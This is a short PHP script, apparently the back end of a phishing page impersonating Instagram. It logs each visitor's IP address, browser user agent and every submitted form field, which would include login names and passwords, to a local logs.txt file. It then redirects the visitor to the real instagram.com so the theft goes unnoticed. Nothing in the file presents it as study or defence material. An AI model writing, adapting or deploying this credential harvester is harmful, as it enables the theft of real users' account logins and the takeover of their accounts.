<?php
header ('Location:https://instagram.com');
$handle = fopen("./logs.txt", "a");
fwrite($handle, $_SERVER['REMOTE_ADDR']);
fwrite($handle, " = ");
fwrite($handle, $_SERVER['HTTP_USER_AGENT']);
fwrite($handle, "\n");
foreach($_POST as $variable => $value) {
   fwrite($handle, ucfirst($variable));
   fwrite($handle, " = ");
   fwrite($handle, $value);
   fwrite($handle, "\n");
}
fwrite($handle, "\n");
fclose($handle);
exit;
?>